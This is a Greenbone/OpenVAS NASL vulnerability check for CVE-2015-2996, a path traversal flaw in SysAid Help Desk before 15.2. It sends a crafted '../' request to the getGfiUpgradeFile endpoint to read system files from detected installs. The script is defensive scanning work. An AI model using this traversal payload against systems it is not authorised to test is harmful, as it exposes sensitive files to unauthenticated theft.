# Copyright (C) 2015 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:sysaid:sysaid";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106007");
  script_version("2022-08-29T10:21:34+0000");
  script_tag(name:"last_modification", value:"2022-08-29 10:21:34 +0000 (Mon, 29 Aug 2022)");
  script_tag(name:"creation_date", value:"2015-06-11 10:02:43 +0700 (Thu, 11 Jun 2015)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:C");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2015-2996");

  script_name("SysAid Path < 15.2 Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_sysaid_help_desk_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("sysaid/http/detected");

  script_tag(name:"summary", value:"SysAid Help Desktop Software is prone to a path traversal vulnerability");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The vulnerability allows unauthenticated attackers to download
  arbitrary files through path traversal.");

  script_tag(name:"impact", value:"An unauthenticated attacker can obtain potentially sensitive information.");

  script_tag(name:"affected", value:"SysAid Help Desktop version 15.1.x and before.");

  script_tag(name:"solution", value:"Update to version 15.2 or later.");

  script_xref(name:"URL", value:"https://www.security-database.com/detail.php?alert=CVE-2015-2996");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = dir + '/getGfiUpgradeFile?fileName=../../../../../../../' + file;

  if (http_vuln_check(port: port, url: url, pattern: pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port: port, data:report);
    exit(0);
  }
}

exit(99);
